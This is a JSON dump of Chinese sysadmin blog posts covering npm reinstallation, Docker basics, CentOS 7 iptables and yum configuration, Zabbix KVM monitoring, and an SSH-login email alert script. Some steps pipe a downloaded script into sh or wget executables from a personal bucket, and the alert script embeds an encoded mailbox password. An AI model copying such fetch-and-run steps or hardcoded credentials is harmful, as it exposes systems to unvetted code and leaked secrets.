andit is therefore better to have npm manage itself and its packages completely on its own instead of letting Homebrew do it. Also, using the Homebrew installation of npm will require you to use sudo when installing global packages.Since one of the core ideas behind Homebrew is that apps can be installed without giving them root access,this is a bad idea. SolutionThis solution fixes the error caused by trying to run npm update npm -g.Once you’re finished, you also won’t need to usesudo to install npm modules globally.Before you start, make a note of any globally installed npm packages.These instructions will have you remove all of those packages.After you’re finished you’ll need to re-install them.Run the following commands to remove all existing global npm modules, uninstall node &amp; npm,re-install node with the right defaults, install npm as its own pacakge,and configure the location for global npm modules to be installed. 12345rm -rf /usr/local/lib/node_modules brew uninstall node brew install node --without-npm echo prefix=~/.node &gt;&gt; ~/.npmrc curl -L https://www.npmjs.com/install.sh | sh 这里的安装脚本可以看我的GitHub Node and npm should be correctly installed at this point.The final step is to add ~/.node/bin to your PATH so commands you install globally are usable.I added this line to my ~/.path script, which gets run via ~/.bash_profile. 设置变量：1export PATH=\"$HOME/.node/bin:$PATH\" Now you can re-install any global packages with the command below,replacing the npm modules with whatever global packages you need. 测试npm安装http-server：1npm install -g http-server node-inspector forever nodemon 版权声明：本站原创文章，于2015年5月16日，由yangc发表. 转载请注明：安装Node.Js 报错 340 解决方法","raw":null,"content":null,"categories":[],"tags":[{"name":"Node.js","slug":"Node-js","permalink":"http://blog.yangcvo.me/tags/Node-js/"}]},{"title":"Docker容器启动过程","slug":"容器-虚拟化/Docker/Docker容器启动过程","date":"2016-08-12T07:25:31.000Z","updated":"2017-04-27T03:09:42.000Z","comments":true,"path":"2016/08/12/容器-虚拟化/Docker/Docker容器启动过程/","link":"","permalink":"http://blog.yangcvo.me/2016/08/12/容器-虚拟化/Docker/Docker容器启动过程/","excerpt":"","text":"下面让我们看看一个Docker容器它启动过程中，背后到底做了什么？ docker run -i -t ubuntu /bin/bash 输入上面这行命令，启动一个ubuntu容器时，到底发生了什么？ 大致过程可以用下图描述： 首先系统要有一个docker daemon的后台进程在运行，当刚才这行命令敲下时，发生了如下动作： docker client(即：docker终端命令行)会调用docker daemon请求启动一个容器， docker daemon会向host os(即：linux)请求创建容器 linux会创建一个空的容器（可以简单理解为：一个未安装操作系统的裸机，只有虚拟出来的CPU、内存等硬件资源） docker daemon请检查本机是否存在docker镜像文件（可以简单理解为操作系统安装光盘），如果有，则加载到容器中（即：光盘插入裸机，准备安装操作系统） 将镜像文件加载到容器中（即：裸机上安装好了操作系统，不再是裸机状态） 最后，我们就得到了一个ubuntu的虚拟机，然后就可以进行各种操作了。 如果在第4步检查本机镜像文件时，发现文件不存在，则会到默认的docker镜像注册机构（即：docker hub网站）去联网下载，下载回来后，再进行装载到容器的动作，即下图所示： 另外官网有一张图也很形象的描述了这个过程： 参考文章：https://www.gitbook.com/book/joshhu/docker_theory_install/detailshttps://docs.docker.com/engine/introduction/understanding-docker/","raw":null,"content":null,"categories":[{"name":"Docker","slug":"Docker","permalink":"http://blog.yangcvo.me/categories/Docker/"}],"tags":[{"name":"Virtualization-Docker","slug":"Virtualization-Docker","permalink":"http://blog.yangcvo.me/tags/Virtualization-Docker/"}]},{"title":"从小站到大站的部署架构总结","slug":"性能与架构/从小站到大站的部署架构总结","date":"2016-08-02T08:39:28.000Z","updated":"2017-04-16T06:46:38.000Z","comments":true,"path":"2016/08/02/性能与架构/从小站到大站的部署架构总结/","link":"","permalink":"http://blog.yangcvo.me/2016/08/02/性能与架构/从小站到大站的部署架构总结/","excerpt":"","text":"一、常见的网站部署架构模型运维部署常见的架构模型，每个公司的项目网站架构演变过程，是否能提高性能和访问瓶颈优化等等。这里我总结常见的网站部署架构： 一、 单机集中式1.1 什么是单机集中方式? 推荐在于创业公司新项目用户量在十几万以内。 12345单机－单个独立的系统实例化部署，也就是把所有的应用都堆积到一个实例上，实例常指：单个主机或者单个vps。 集中式－集中的什么？集中的应用(Application)、文件(DATA)、数据(File)。 Application 包括一部分 app server 和应用程序代码。 File 常指静态类型的文件，后缀常见如： DATA 数据，我们可以通过文件存储 也可以通过Database来存储 1.2、 常见的集中化部署架构模型（当然也常见在多机模式下），如下： 1234如：LAMP＝Linux+Apache+Mysql+PHP LNMP= Linux+Nginx+Mysql+PHP Linux + Tomcat + Oracle + JAVA Linux +Nginx + Tomcat + JAVA + Oracle 1.3、优缺点 12优点：1、简单－部署简单 2、成本低廉（时间、硬件投入、人员等等）3、访问延迟 缺点：1、单机风险 2、性能瓶颈短板 3、可靠性弱 二、多机器分层服务化部署公司慢慢成长壮大，发现访问用户量PV上面来了，服务器达到瓶颈，服务也出现访问出现超时，这个时候会慢慢改变整个架构。 推荐在于创业公司新项目用户量在百万以上。 2.1、 水平拆分与垂直拆分 1什么是水平拆分？应用层＋数据层 ＝》应用层＋服务层 ＋ 数据层 or 代理层 ＋ 应用层 ＋服务层 ＋数据层 or 应用层 + 服务层 + 数据缓存层 ＋ 数据层 什么是垂直拆分？ 1将一个单一业务系统，按照业务逻辑关系拆分成多个子系统。一方面、有助于软件维护。另一方面、提高整体业务的并发处理能力和功能扩展。 在说明白点就是：之前服务都是在一起，除了硬件增多， 现在都是单个跑资源比较清晰也很好定位问题，不会互相占用，每个服务功能分不同模块，这个是为了提高处理并发能力，应用扩展方便，数据库主从，优化，然后服务请求一层层网络，安全性需要考虑优先。 2.2 从集中模式分层拆分应该注意什么 12341、应用建议与数据隔离 2、应用与数据连接交互增多，对网络要求极高，建议集中在内网模式。 2、服务器硬件选型，数据库的IO交互 程序处理逻辑集中决定需要更多的计算量 3、着重设计数据库存储引擎、数据库表结构等，数据库的维护成本较高。 三、 分布式架构部署思想：将各系统平凡需要调用到的接口单独抽离出，作为单独的系统对外提供服务。 3.1 大型分布式系统架构 1234567891011121314151617特点： （1）高并发、大流量：PV量巨大 （2）高可用：7*24小时不间断服务 （3）海量数据：文件数目分分钟xxTB （4）用户分布广泛，服务分机房部署：网络情况复杂：网络运营商 （5）接入第三方CDN服务，提高异地访问请求加快。目的： 经过分层和分割处理后，可以使更多的计算机可靠的完成同样的功能。 带来的缺陷： （1）数据调用延迟：由于必须通过网络进行调用，在网络介质中的传输延时可能导致性能问题。 （2）由于服务器增多，导致延机，从而降低整个系统的可靠性 （3）数据的一致性出现困难，尤其对于对数据要求实时性很高的应用，分布式的事务处理起来也会比较费劲。 （4）错综复杂的网络、应用环境增加维护和管理成本。 这里找到之前看到一张图典型架构图示如下：","raw":null,"content":null,"categories":[{"name":"Framework","slug":"Framework","permalink":"http://blog.yangcvo.me/categories/Framework/"}],"tags":[{"name":"Performance and framework","slug":"Performance-and-framework","permalink":"http://blog.yangcvo.me/tags/Performance-and-framework/"}]},{"title":"推荐一个保护眼睛👀的软件－f-lux","slug":"个人生活记录/推荐一个保护眼睛👀的软件－f-lux","date":"2016-07-31T08:35:30.000Z","updated":"2017-03-14T05:56:02.000Z","comments":true,"path":"2016/07/31/个人生活记录/推荐一个保护眼睛👀的软件－f-lux/","link":"","permalink":"http://blog.yangcvo.me/2016/07/31/个人生活记录/推荐一个保护眼睛👀的软件－f-lux/","excerpt":"","text":"最近天天加班然后晚上盯着电脑，眼睛一直很干涩，非常难受。正巧昨天在GitHub上闲逛，无意间发现了别人推荐的这个软件f.lux，Mac上下载试用了一下。觉得很不错，推荐一下！也许是我孤陋寡闻了，可能大家都已经在用了…… 安装f.lux的功能很简单，就是可以根据时间的变化调节电脑的显示。但是这里的调节不是简单的亮度调节，而是调节显示屏的色温（简单的说就是白天冷色调，晚上暖色调）。可以从f.lux官网下载安装，然后打开，界面如下： 官网翻译: 你f.lux安装程序是一个.zip文件 - 它应该是在你下载的文件夹中。双击它安装f.lux。 一旦f.lux安装并运行，你应该看到f.lux Preferences窗口出现。在这里，你可以输入自己的位置，并设置你平时的起床时间。f.lux使用此信息为您创建一个自定义照明计划。 你可以打开首随时查看和更改您的f.lux设置。该f.lux菜单总是可以找到您的系统时钟的左侧。 官网使用说明地址 f.lux白天是每当太阳在你的位置。默认情况下，f.lux在6500K白天，并且不改变你的屏幕的颜色。 如果你喜欢很暖白天的颜色，选择选项&gt;扩展白天设置从f.lux菜单。 日落时太阳已经下山了，但你是清醒的。如果你是一个早起的人，这也是你的日出前的清晨设置。日落的颜色被设计成与正常的暖白光室内照明很好地工作。如果平时在日出前醒来，你可能更喜欢一个更温和的（4500K或亮）日落设置。 睡前是当你上床准备（或已经在它）睡觉前的时间。在睡前设置你的唤醒时间的变化。它清除掉，从你的屏幕尽可能提醒的光芒使你能感觉到自己的身体越来越厌倦。你可以去用f.lux随时随地睡觉-每当你感到困倦。 f.lux的色温调节有三个时段，分别是白天、日落和睡眠。日落时间会根据设置的经纬度自动设置，每个时间段的色温可以自已定义，也可以选择右上角的定义好的模式。 多系统支持目前f.lux 支持Windows、Mac、Linux以及iOS（要越狱）。几乎覆盖了当前主要的操作系统，Android也很快会支持。 这个软件很小，而且装上之后系统资源占用很低，非常值得一试的软件。从现在开始保护你的眼睛吧！","raw":null,"content":null,"categories":[{"name":"生活","slug":"生活","permalink":"http://blog.yangcvo.me/categories/生活/"}],"tags":[{"name":"Personal life record","slug":"Personal-life-record","permalink":"http://blog.yangcvo.me/tags/Personal-life-record/"}]},{"title":"坚持一个月3公里跑步🏃下来","slug":"个人生活记录/坚持一个月3公里跑步🏃下来","date":"2016-07-29T06:50:26.000Z","updated":"2017-03-14T05:55:54.000Z","comments":true,"path":"2016/07/29/个人生活记录/坚持一个月3公里跑步🏃下来/","link":"","permalink":"http://blog.yangcvo.me/2016/07/29/个人生活记录/坚持一个月3公里跑步🏃下来/","excerpt":"","text":"坚持跑步🏃写这篇日记是因为受到之前看到一篇特别好的文章，是运维的赵班长写的，分享他的技术博客论坛：https://www.unixhot.com/ 因为之前很早认识他了，看过他录的ELK全部视频，受益匪浅，这个是去年的事情了。 跑步需要一个圈子因为也有一部分的原因是：朋友圈一直在刷跑步的记录，让我也很感兴趣，因为一个人的确是不想跑的，而且这时候：2016年7月20日时杭州今年最热的天气：高温40°c更加没有毅力去坚持每天给自己身体充电了。 在之前的公司也是天天加班熬夜，没有经常锻炼，一米8的个子从读书出来，62体重。到现在58已经瘦了很多，之前的八块腹肌，现在成了4块。 圈子可以加APP里面很多运动跑步团，现在APP做的还是很不错的。 推荐使用APP GPS定位我一开始用了悦动圈后来用了虎扑跑步，现在在用6只脚。 每天记录：第一天：3公里下来，发现退步了不少，好久没运动，身体的体能变这么差，看样子以后要多锻炼了看看能坚持几天。 第二天：昨天3公里，今天4公里，明天继续坚持。 第三天：全程跑下来，全身湿透，好比蒸桑拿一样，太热 后面坚持了一个月下来，每天跑完拉拉韧带，做下有氧运动是比较好的方式。 运动一个月发现睡眠更好了。之前一直失眠，以后继续坚持，跑步🏃又在网上买了专业的运动服最好买两套可以换洗，跑鞋。 因为爱上了跑步，也认识了很多健身的朋友。希望努力以后可以把身体的体重往60发展。哈哈","raw":null,"content":null,"categories":[{"name":"生活","slug":"生活","permalink":"http://blog.yangcvo.me/categories/生活/"}],"tags":[{"name":"Personal life record","slug":"Personal-life-record","permalink":"http://blog.yangcvo.me/tags/Personal-life-record/"}]},{"title":"centos6和centos7细节变化和配置","slug":"Linux笔记/centos7.1/centos6和centos7细节变化和配置","date":"2016-07-24T07:20:18.000Z","updated":"2017-04-01T09:34:23.000Z","comments":true,"path":"2016/07/24/Linux笔记/centos7.1/centos6和centos7细节变化和配置/","link":"","permalink":"http://blog.yangcvo.me/2016/07/24/Linux笔记/centos7.1/centos6和centos7细节变化和配置/","excerpt":"","text":"(1)桌面系统12[CentOS6] GNOME 2.x[CentOS7] GNOME 3.x（GNOME Shell） (2)文件系统12[CentOS6] ext4[CentOS7] xfs (3)内核版本12[CentOS6] 2.6.x-x[CentOS7] 3.10.x-x (4)默认数据库12[CentOS6] MySQL[CentOS7] MariaDB (5)文件结构12[CentOS6] /bin, /sbin, /lib, and /lib64在/下[CentOS7] /bin, /sbin, /lib, and /lib64移到/usr下 (6)主机名12[CentOS6] /etc/sysconfig/network[CentOS7] /etc/hostname (7)时间同步1234567[CentOS6]$ ntp$ ntpq -p[CentOS7]$ chrony$ chronyc sources (8)修改时间123456789[CentOS6]$ vim /etc/sysconfig/clock ZONE=\"Asia/Tokyo\" UTC=fales$ sudo ln -s /usr/share/zoneinfo/Asia/Tokyo /etc/localtime[CentOS7]$ timedatectl set-timezone Asia/Tokyo$ timedatectl status ###(9)修改地区 123456789[CentOS6]$ vim /etc/sysconfig/i18n LANG=\"ja_JP.utf8\"$ /etc/sysconfig/i18n$ locale[CentOS7]$ localectl set-locale LANG=ja_JP.utf8$ localectl status centos7 修改主机名例如，要永久修改主机名，你可以修改静态主机名： 123$ sudo hostnamectl --static set-hostname &lt;host-name&gt;要同时修改所有三个主机名：静态、瞬态和灵活主机名：$ sudo hostnamectl set-hostname &lt;host-name&gt; 注意，你不必重启机器以激活永久主机名修改。上面的命令会立即修改内核主机名。注销并重新登入后在命令行提示来观察新的静态主机名。 Centos7故障Centos7最小化服务器版本使用“ifconfig”命令提示没有查看网卡细节，输入以下命令： ip addr找不到ifconfig，net-tools包提供了ifconfig命令。因此，让我们安装net-tools包来使用ifconfig命令。 yum install net-tools就可以实现了。 如果安装还是找不到的话 修复下： 1234567修改vim /etc/profile在最后面一行添加这一条命令 export PATH=/sbin:$PATH修改用户主目录下面隐藏文件.bashrc修改只对该用户有效查看用户下面的隐藏的文件 修改.bashrc 修改以后 保存注销登陆。用echo $PATH 查看export PATH=/sbin:$PATH修改生效了。 CentOS7默认的防火墙不是iptables,而是firewalle.找不到iptables config文件CentOS 7.0默认使用的是firewall作为防火墙，这里改为iptables防火墙。firewall： 12systemctl start firewalld.service#启动firewallsystemctl stop firewalld.service#停止firewall 安装iptable iptable-service 1234#先检查是否安装了iptables service iptables status #安装iptables yum install -y iptables #升级iptables yum update iptables#安装iptables-services yum install iptables-services 设置现有规则： 123456789101112131415161718192021222324252627282930#查看iptables现有规则iptables -L -n#先允许所有,不然有可能会杯具iptables -P INPUT ACCEPT#清空所有默认规则iptables -F#清空所有自定义规则iptables -X#所有计数器归0iptables -Z#允许来自于lo接口的数据包(本地访问)iptables -A INPUT -i lo -j ACCEPT#开放22端口iptables -A INPUT -p tcp --dport 22 -j ACCEPT#开放21端口(FTP)iptables -A INPUT -p tcp --dport 21 -j ACCEPT#开放80端口(HTTP)iptables -A INPUT -p tcp --dport 80 -j ACCEPT#开放443端口(HTTPS)iptables -A INPUT -p tcp --dport 443 -j ACCEPT#允许pingiptables -A INPUT -p icmp --icmp-type 8 -j ACCEPT#允许接受本机请求之后的返回数据 RELATED,是为FTP设置的iptables -A INPUT -m state --state RELATED,ESTABLISHED -j ACCEPT#其他入站一律丢弃iptables -P INPUT DROP#所有出站一律绿灯iptables -P OUTPUT ACCEPT#所有转发一律丢弃iptables -P FORWARD DROP 其他规则： 1234#如果要添加内网ip信任（接受其所有TCP请求） iptables -A INPUT -p tcp -s 45.96.174.68 -j ACCEPT #过滤所有非以上规则的请求 iptables -P INPUT DROP #要封停一个IP，使用下面这条命令： iptables -I INPUT -s ***.***.***.*** -j DROP #要解封一个IP，使用下面这条命令: iptables -D INPUT -s ***.***.***.*** -j DROP 保存规则设定 12#保存上述规则service iptables save centos设置iptables配置规则脚本： 12345678910111213#!/bin/sh iptables -P INPUT ACCEPT iptables -F iptables -X iptables -Z iptables -A INPUT -i lo -j ACCEPT iptables -A INPUT -p tcp --dport 22 -j ACCEPT iptables -A INPUT -p tcp --dport 21 -j ACCEPT iptables -A INPUT -p tcp --dport 80 -j ACCEPT iptables -A INPUT -p tcp --dport 443 -j ACCEPT iptables -A INPUT -p icmp --icmp-type 8 -j ACCEPT iptables -A INPUT -m state --state RELATED,ESTABLISHED -j ACCEPT iptables -P INPUT DROP iptables -P OUTPUT ACCEPT iptables -P FORWARD DROP service iptables save systemctl restart iptables.service 解决Centos7.1各种yum报错Error这里我更换源第一种方法：执行yum list就开始报错： 1.Error: Cannot retrieve metalink for repository: epel. Please verify its path and try again 在网上查了查，解决办法是编辑/etc/yum.repos.d/epel.repo，把基础的恢复，镜像的地址注释掉 12#baseurlmirrorlist 改成 12baseurl#mirrorlist 这里如果还是不行，可以使用我这里贴出的源码文件。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162# CentOS-Base.repo## The mirror system uses the connecting IP address of the client and the# update status of each mirror to pick mirrors that are updated to and# geographically close to the client. You should use this for CentOS updates# unless you are manually picking other mirrors.## If the mirrorlist= does not work for you, as a fall back you can try the# remarked out baseurl= line instead.##[base]name=CentOS-$releasever - Base - mirrors.aliyun.comfailovermethod=prioritybaseurl=http://mirrors.aliyun.com/centos/$releasever/os/$basearch/ http://mirrors.aliyuncs.com/centos/$releasever/os/$basearch/#mirrorlist=http://mirrorlist.centos.org/?release=$releasever&amp;arch=$basearch&amp;repo=osgpgcheck=1gpgkey=http://mirrors.aliyun.com/centos/RPM-GPG-KEY-CentOS-7#released updates[updates]name=CentOS-$releasever - Updates - mirrors.aliyun.comfailovermethod=prioritybaseurl=http://mirrors.aliyun.com/centos/$releasever/updates/$basearch/ http://mirrors.aliyuncs.com/centos/$releasever/updates/$basearch/#mirrorlist=http://mirrorlist.centos.org/?release=$releasever&amp;arch=$basearch&amp;repo=updatesgpgcheck=1gpgkey=http://mirrors.aliyun.com/centos/RPM-GPG-KEY-CentOS-7#additional packages that may be useful[extras]name=CentOS-$releasever - Extras - mirrors.aliyun.comfailovermethod=prioritybaseurl=http://mirrors.aliyun.com/centos/$releasever/extras/$basearch/ http://mirrors.aliyuncs.com/centos/$releasever/extras/$basearch/#mirrorlist=http://mirrorlist.centos.org/?release=$releasever&amp;arch=$basearch&amp;repo=extrasgpgcheck=1gpgkey=http://mirrors.aliyun.com/centos/RPM-GPG-KEY-CentOS-7#additional packages that extend functionality of existing packages[centosplus]name=CentOS-$releasever - Plus - mirrors.aliyun.comfailovermethod=prioritybaseurl=http://mirrors.aliyun.com/centos/$releasever/centosplus/$basearch/ http://mirrors.aliyuncs.com/centos/$releasever/centosplus/$basearch/#mirrorlist=http://mirrorlist.centos.org/?release=$releasever&amp;arch=$basearch&amp;repo=centosplusgpgcheck=1enabled=0gpgkey=http://mirrors.aliyun.com/centos/RPM-GPG-KEY-CentOS-7#contrib - packages by Centos Users[contrib]name=CentOS-$releasever - Contrib - mirrors.aliyun.comfailovermethod=prioritybaseurl=http://mirrors.aliyun.com/centos/$releasever/contrib/$basearch/ http://mirrors.aliyuncs.com/centos/$releasever/contrib/$basearch/#mirrorlist=http://mirrorlist.centos.org/?release=$releasever&amp;arch=$basearch&amp;repo=contribgpgcheck=1enabled=0gpgkey=http://mirrors.aliyun.com/centos/RPM-GPG-KEY-CentOS-7 第二套yum源文件： 12345678910111213141516171819202122232425262728293031[base]name=CentOS-$releasever - Basemirrorlist=http://mirrorlist.centos.org/?release=$releasever&amp;arch=$basearch&amp;repo=os&amp;infra=$infra#baseurl=http://mirror.centos.org/centos/$releasever/os/$basearch/gpgcheck=1gpgkey=file:///etc/pki/rpm-gpg/RPM-GPG-KEY-CentOS-7#released updates [updates]name=CentOS-$releasever - Updatesmirrorlist=http://mirrorlist.centos.org/?release=$releasever&amp;arch=$basearch&amp;repo=updates&amp;infra=$infra#baseurl=http://mirror.centos.org/centos/$releasever/updates/$basearch/gpgcheck=1gpgkey=file:///etc/pki/rpm-gpg/RPM-GPG-KEY-CentOS-7#additional packages that may be useful[extras]name=CentOS-$releasever - Extrasmirrorlist=http://mirrorlist.centos.org/?release=$releasever&amp;arch=$basearch&amp;repo=extras&amp;infra=$infra#baseurl=http://mirror.centos.org/centos/$releasever/extras/$basearch/gpgcheck=1gpgkey=file:///etc/pki/rpm-gpg/RPM-GPG-KEY-CentOS-7#additional packages that extend functionality of existing packages[centosplus]name=CentOS-$releasever - Plusmirrorlist=http://mirrorlist.centos.org/?release=$releasever&amp;arch=$basearch&amp;repo=centosplus&amp;infra=$infra#baseurl=http://mirror.centos.org/centos/$releasever/centosplus/$basearch/gpgcheck=1enabled=0gpgkey=file:///etc/pki/rpm-gpg/RPM-GPG-KEY-CentOS-7 这里我弄成文件了，直接导入试试下就可以了。 下载： CentOS-Base.repo1 CentOS-Base.repo2","raw":null,"content":null,"categories":[{"name":"Linux","slug":"Linux","permalink":"http://blog.yangcvo.me/categories/Linux/"}],"tags":[{"name":"Linux note","slug":"Linux-note","permalink":"http://blog.yangcvo.me/tags/Linux-note/"}]},{"title":"KVM monitoring through Zabbix","slug":"性能监控/Zabbix/Zabbix 监控 KVM集群","date":"2016-07-21T10:42:58.000Z","updated":"2017-03-21T10:25:06.000Z","comments":true,"path":"2016/07/21/性能监控/Zabbix/Zabbix 监控 KVM集群/","link":"","permalink":"http://blog.yangcvo.me/2016/07/21/性能监控/Zabbix/Zabbix 监控 KVM集群/","excerpt":"","text":"KVM monitoring through ZabbixMonitor your KVM resources through Zabbix Zabbix 监控 KVM 安装依赖python2, libvirt-python (tested with 0.9.12.3, 0.10.2 and 1.1.3.x) pip install libvirt-python KVM Server 设定程序123456cd /usr/local/bin/wget https://github.com/bushvin/zabbix-kvm-res/raw/master/bin/zabbix-kvm-res.pychmod a+x zabbix-kvm-res.pycd /etc/zabbix/zabbix_agentd.dwget https://github.com/bushvin/zabbix-kvm-res/raw/master/zabbix_agentd.conf/UserParametersservice zabbix-agent restart Zabbix Server 设定程序至https://github.com/bushvin/zabbix-kvm-res下载zabbix_kvm.xml将zabbix_kvm.xml 汇入至Zabbix Server → Configuration → Templates → Import","raw":null,"content":null,"categories":[{"name":"monitoring","slug":"monitoring","permalink":"http://blog.yangcvo.me/categories/monitoring/"}],"tags":[{"name":"Performance monitoring","slug":"Performance-monitoring","permalink":"http://blog.yangcvo.me/tags/Performance-monitoring/"},{"name":"zabbix","slug":"zabbix","permalink":"http://blog.yangcvo.me/tags/zabbix/"}]},{"title":"Docker容器部署tomcat出现中文乱码","slug":"容器-虚拟化/Docker/Docker容器部署tomcat出现中文乱码","date":"2016-07-19T10:33:03.000Z","updated":"2017-03-23T13:57:40.000Z","comments":true,"path":"2016/07/19/容器-虚拟化/Docker/Docker容器部署tomcat出现中文乱码/","link":"","permalink":"http://blog.yangcvo.me/2016/07/19/容器-虚拟化/Docker/Docker容器部署tomcat出现中文乱码/","excerpt":"","text":"这里我先查看下实例： 123456789101112131415[root@docker1 ~]# docker exec -it 41de9a0b6045 localeLANG=LC_CTYPE=\"POSIX\"LC_NUMERIC=\"POSIX\"LC_TIME=\"POSIX\"LC_COLLATE=\"POSIX\"LC_MONETARY=\"POSIX\"LC_MESSAGES=\"POSIX\"LC_PAPER=\"POSIX\"LC_NAME=\"POSIX\"LC_ADDRESS=\"POSIX\"LC_TELEPHONE=\"POSIX\"LC_MEASUREMENT=\"POSIX\"LC_IDENTIFICATION=\"POSIX\"LC_ALL= docker默认为POSIX在Dockerfile 里添加 1ENV LANG en_US.UTF-8 发现网上很多都是这个教程，那么现在给个实用的。 我这里是centos 7.1系统。 设置后，使用en_US.UTF-8中文locale 12345678910111213141516[root@a9f82e7842c1 ~]# export LC_ALL=en_US.UTF-8[root@a9f82e7842c1 ~]# localeLANG=LC_CTYPE=\"en_US.UTF-8\"LC_NUMERIC=\"en_US.UTF-8\"LC_TIME=\"en_US.UTF-8\"LC_COLLATE=\"en_US.UTF-8\"LC_MONETARY=\"en_US.UTF-8\"LC_MESSAGES=\"en_US.UTF-8\"LC_PAPER=\"en_US.UTF-8\"LC_NAME=\"en_US.UTF-8\"LC_ADDRESS=\"en_US.UTF-8\"LC_TELEPHONE=\"en_US.UTF-8\"LC_MEASUREMENT=\"en_US.UTF-8\"LC_IDENTIFICATION=\"en_US.UTF-8\"LC_ALL=en_US.UTF-8 上面是临时生效。永久生效写到/etc/profile vim /etc/profile export PATH USER LOGNAME MAIL HOSTNAME HISTSIZE HISTCONTROL LC_ALL export LC_ALL=en_US.UTF-8 查看语言是否变更docker exec -t 容器名 locale 就已经全部更新了。乱码也就不会出现了。 这个是之前tomcat出现乱码的 日志截图一小部分： 12345678920-Oct-2016 13:49:34.591 INFO [main] org.apache.catalina.startup.Catalina.start Server startup in 41115 ms?????: 0editSyncOldChat-?????????--????????: 0editSyncOldChat-?????????--????????: 0editSyncOldChat-?????????--????????: 0editSyncOldChat-?????????--???","raw":null,"content":null,"categories":[{"name":"Docker","slug":"Docker","permalink":"http://blog.yangcvo.me/categories/Docker/"}],"tags":[{"name":"Virtualization-Docker","slug":"Virtualization-Docker","permalink":"http://blog.yangcvo.me/tags/Virtualization-Docker/"}]},{"title":"使用shell脚本实现ssh登录报警","slug":"运维笔记/使用shell脚本实现ssh登录报警","date":"2016-07-19T08:39:28.000Z","updated":"2016-11-05T04:45:04.000Z","comments":true,"path":"2016/07/19/运维笔记/使用shell脚本实现ssh登录报警/","link":"","permalink":"http://blog.yangcvo.me/2016/07/19/运维笔记/使用shell脚本实现ssh登录报警/","excerpt":"","text":"如果你服务器被入侵了，该怎么做才能让自己第一时间知晓？对大部分的人来说，这个的确很不好定位，其实也可以简单些个变量环境，这样下次登录以后可以看到登录的记录，可是这样的话会被黑客发现，所以我们这里按脚本自动发送。 在逛一些博客上面看到一篇这文章，所以觉得不错，这里整理了下，发给大家。其实这种脚本可以放到对应的堡垒机或者跳板机机器上面因为对一台做管理，下面做了设置，就很方便了。 1、首先来配置发件环境，这里介绍CentOS12345678yum install perl-IO-Socket-SSL perl-Net-SSLeay -ywget http://oak0aohum.bkt.clouddn.com/sendEmail-v1.56.tar.gz -O /tmp/sendEmail-v1.56.tar.gzcd /tmptar xf sendEmail-v1.56.tar.gzmv sendEmail-v1.56/sendEmail /usr/local/bin/chmod +x /usr/local/bin/sendEmail &amp;&amp; cdwget http://oak0aohum.bkt.clouddn.com/jq -O /usr/local/bin/jqchmod +x /usr/local/bin/jq 2、然后配置报警邮件123456wget http://oak0aohum.bkt.clouddn.com/WarringLoging.sh -O /etc/WarringLoging.shchmod +x /etc/WarringLoging.shyum install -y screen 安装screen #echo \"screen -fa -d -m -S WL /etc/WarringLoging.sh\" &gt;&gt; /etc/profile #第一种方法，新开终端复制终端都会报警#echo -e \"#!/bin/bash\\nbash /etc/WarringLoging.sh\" &gt;&gt; /etc/ssh/sshrc #第二种方法，只有ssh登录才会报警#上面两种方法任选一个都可以 3、最后编辑收发邮件的信息vim /etc/WarringLoging.sh 123456789101112131415161718192021 #!/bin/bash########################################################################## File Name: WarringLoging.sh# Author: yangc# Email: yangcvo@gmail.com# Version:# Created Time: Wed 22 Jul 2015 01:41:09 AM CST#########################################################################eval `curl -s \"http://ip.taobao.com/service/getIpInfo.php?ip=$&#123;SSH_CLIENT%% *&#125;\" | jq . | awk -F':|[ ]+|\"' '$3~/^(country|area|region|city|isp)$/&#123;print $3\"=\"$7&#125;'`EMAIL=`which sendEmail`FEMAIL=\"it@health.com\" #发件邮箱MAILP=\"MzU0ODZjOWI0MWU3\" #发件邮箱密码MAILSMTP=\"smtp.exmail.qq.com\" #发件邮箱的SMTPMAILT=\"chengyangyang@health.com\" #收件邮箱MAILmessage=\"登入者IP地址：$&#123;SSH_CLIENT%% *&#125;\\n\\IP归属地：$&#123;country&#125;_$&#123;area&#125;_$&#123;region&#125;_$&#123;city&#125;_$&#123;isp&#125;\\n\\被登录服务器IP：$(curl -s ip.cn| grep -Eo '([0-9]&#123;1,3&#125;[\\.])&#123;3&#125;[0-9]&#123;1,3&#125;')\"$EMAIL -q -f $FEMAIL -t $MAILT -u \"您服务器有人登录SSH\" -m \"$MAILmessage\" -s $MAILSMTP -o message-charset=utf-8 -xu $FEMAIL -xp $MAILP 下载脚本地址：WarringLoging.sh 给予执行权限：chmod +x /etc/WarringLoging.sh 其实这里脚本下面可以自定义： 123456789-f 表示from，发件人地址-t 表示to，收件人地址-s mail服务器域名-u 主题-xu 用户名（@之前的）-xp 用户密码-m 纯文本信息-o message-file=/root/.. 发送文件中的内容-a 发送附件 （-m,-o,-a可以同时使用） 邮件发送实现效果。 iPhone手机提醒效果：","raw":null,"content":null,"categories":[{"name":"运维笔记","slug":"运维笔记","permalink":"http://blog.yangcvo.me/categories/运维笔记/"}],"tags":[]},{"title":"Docker容器时间同步修改docker时区","slug":"容器-虚拟化/Docker/Docker容器时间同步修改docker时区","date":"2016-07-19T04:33:03.000Z","updated":"2017-03-14T05:46:44.000Z","comments":true,"path":"2016/07/19/容器-虚拟化/Docker/Docker容器时间同步修改docker时区/","link":"","permalink":"http://blog.yangcvo.me/2016/07/19/容器-虚拟化/Docker/Docker容器时间同步修改docker时区/","excerpt":"","text":"前几天遇到这样一个业务场景，数据库运行在Docker 中，docker 的市区是utc 所以就跟北京时间相差8个小时。但是又不能重新运行一个容器，只能保证数据库运行状态，并把宿主机的时区复制给docker 容器。很苦恼.首先我先把宿主机的时区改成啦CST 北京时间。然后把宿主机的时区复制给docker 容器。命令如下: docker cp /etc/localtime:【容器ID或者NAME】/etc/localtime 当然也可以进入容器进行修改时区（不过我的容器修改的时候总是报/etc/localtime 文件只读，不让修改。所以就用了上面的方法），命令如下:首先添加所有的时区然后再修改时区 123apk add tzdata ln -sf /usr/share/zoneinfo/Asia/Shanghai /etc/localtime echo \"Asia/Shanghai\" &gt; /etc/timezone 当然，在容器内改，也很麻烦，每次启动新的容器那么就要修改，所以在dockerfile 中修改更好啦。命令如下 123ENV TZ=Asia/ShanghaiRUN ln -snf /usr/share/zoneinfo/$TZ /etc/localtime &amp;&amp; echo $TZ &gt; /etc/timezoneRUN /bin/echo -e \"ZONE=\"Asia/Shanghai\"\\nUTC=false\\nRTC=false\" &gt; /etc/sysconfig/clock 查看时间是否正确docker exec -t 容器ID date 问题：问题1： Docker中mysql时间相差八小时，java log的时间是不对的，尝试过在DockerFile中添加: RUN ln -sf 